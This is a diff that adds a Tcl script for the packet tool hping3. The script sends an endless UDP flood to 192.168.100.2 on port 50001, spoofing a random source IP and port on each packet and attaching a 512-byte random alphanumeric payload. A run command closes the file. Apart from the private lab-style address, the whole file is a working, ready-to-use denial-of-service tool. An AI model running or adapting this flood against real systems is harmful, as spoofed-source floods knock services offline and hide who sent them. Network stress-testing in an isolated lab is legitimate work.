@@ -1,0 +1,45 @@
+# Hping3 UDP Flood (512 bytes random alphanumeric payload) with TCL script
+# UDP Flood (rand source IP and port, dest port 50001, ttl=64, payload=512 random letters/numbers)
+
+set dst_ip "192.168.100.2"
+set dst_port 50001
+set count 0
+
+# Function to generate random IP address
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Function to generate random source port (1024–65535)
+proc random_port {} {
+    return [expr {int(rand()*64512) + 1024}]
+}
+
+# Function to generate a random alphanumeric payload of N bytes
+proc random_payload {size} {
+    set charset "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    set max [string length $charset]
+    set p ""
+    for {set i 0} {$i < $size} {incr i} {
+        set idx [expr {int(rand()*$max)}]
+        append p [string index $charset $idx]
+    }
+    return $p
+}
+
+while {1} {
+    set saddr [random_ip]
+    set sport [random_port]
+    set payload [random_payload 512]
+
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+udp(sport=$sport,dport=$dst_port)+data(str=$payload)"
+    hping send $pkt
+
+    incr count
+
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count UDP packets sent so far..."
+    }
+}
+
+# To run: sudo hping3 exec udp_random_payload.htcl
